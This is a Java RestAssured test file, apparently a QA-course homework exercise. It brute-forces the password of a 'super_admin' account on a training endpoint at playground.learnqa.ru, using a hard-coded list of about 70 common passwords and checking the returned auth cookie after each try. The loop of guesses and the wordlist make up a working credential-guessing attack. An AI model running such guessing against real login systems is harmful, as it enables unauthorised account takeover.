package Ex9pass;

import io.restassured.RestAssured;
import io.restassured.http.ContentType;
import io.restassured.response.Response;
import org.junit.jupiter.api.Test;

import java.lang.reflect.Array;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import static io.restassured.RestAssured.given;

public class Ex9pass {
    @Test


    public void testRestAssured() {
        String[] passwords = new String[]{"1234", "12345", "111111", "121212", "123123", "123456", "555555", "654321", "666666", "696969", "888888",
                "1234567", "7777777", "12345678", "123456789", "1234567890", "!@#$%^&*", "000000", "123qwe",
                "1q2w3e4r", "1qaz2wsx", "aa123456", "abc123", "access", "admin", "adobe123", "ashley", "azerty",
                "bailey", "baseball", "batman", "charlie", "donald", "dragon", "flower", "football", "Football",
                "freedom", "hello", "hottie", "iloveyou", "jesus", "letmein", "login", "lovely", "loveme", "master",
                "michael", "monkey", "mustang", "ninja", "passw0rd", "password", "password1", "photoshop", "princess",
                "qazwsx", "qwerty", "qwerty123", "qwertyuiop", "shadow", "solo", "starwars", "sunshine", "superman", "trustno1",
                "welcome", "whatever", "zaq1zaq1"};

        for (int i = 0; i < passwords.length; i++) {

            String req_body_new = "{\n" + " \"login\":" + " " + "\"" + "super_admin" + "\"" + "," + "\n" + " \"password\":" + " " + "\"" + passwords[i] + "\"" + " \n}";

            Response response_login_new = given()
                    .contentType(ContentType.JSON)
                    .body(req_body_new)
                    .when()
                    .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
                    .then().extract().response();

            String cookies_number_new = response_login_new.getCookies().get("auth_cookie");

            String cookie_new = "auth_cookie=" + cookies_number_new;

            Response response_auth_new = given()
                    .contentType("application/json")
                    .cookie(cookie_new)
                    .get("https://playground.learnqa.ru/ajax/api/check_auth_cookie")
                    .then().extract().response();


            if (response_auth_new.getBody().asString().equals("You are authorized")) {

                System.out.println(response_auth_new.getBody().asString());
                System.out.println(req_body_new);

                break;

            }

        }
    }
}